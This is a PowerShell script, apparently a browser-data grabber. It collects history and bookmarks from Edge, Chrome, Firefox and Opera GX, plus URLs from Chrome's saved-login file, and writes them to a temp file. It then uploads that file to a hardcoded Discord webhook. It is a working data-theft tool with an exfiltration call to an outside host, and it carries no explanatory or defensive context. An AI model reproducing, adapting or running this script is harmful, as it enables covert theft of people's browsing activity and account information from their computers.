function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter (Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter (Position=2,Mandatory = $True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'passwords' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
    else { return }

    if (Test-Path $Path) {
        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | ForEach-Object {($_.Matches).Value} | Sort -Unique
        $OutputFile = "$env:TEMP\BrowserData.txt"

        "[$Browser - $DataType]" | Out-File -FilePath $OutputFile -Append
        $Value | Out-File -FilePath $OutputFile -Append
        "`n" | Out-File -FilePath $OutputFile -Append
    }
}

$OutputFile = "$env:TEMP\BrowserData.txt"
if (Test-Path $OutputFile) { Remove-Item $OutputFile }

Get-BrowserData -Browser "edge" -DataType "history"
Get-BrowserData -Browser "edge" -DataType "bookmarks"
Get-BrowserData -Browser "chrome" -DataType "history"
Get-BrowserData -Browser "chrome" -DataType "bookmarks"
Get-BrowserData -Browser "chrome" -DataType "passwords"
Get-BrowserData -Browser "firefox" -DataType "history"
Get-BrowserData -Browser "opera" -DataType "history"
Get-BrowserData -Browser "opera" -DataType "bookmarks"

Write-Host "Browser data saved to: $OutputFile"

function Upload-Discord {
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $True)]
        [string]$FilePath,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]$WebhookUrl
    )

    $File = Get-Item -Path $FilePath
    $FileContent = [System.IO.File]::ReadAllBytes($File.FullName)
    
    $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    
    $Body = @"
--$Boundary
Content-Disposition: form-data; name="file"; filename="$($File.Name)"
Content-Type: application/octet-stream

$([System.Text.Encoding]::UTF8.GetString($FileContent))
--$Boundary--
"@
    
    $Headers = @{
        "Content-Type" = "multipart/form-data; boundary=$Boundary"
    }
    
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -Headers $Headers
}

$WebhookUrl = "https://discord.com/api/webhooks/1357047347896389743/zp26Zl9HmYAIcmZcs9zWeSN9J_VdEK4anwXpPXqD44AmOnAeXZa3hfTHn2o1UIsryrjS"
$FilePath = "$env:TMP\BrowserData.txt"

Upload-Discord -FilePath $FilePath -WebhookUrl $WebhookUrl

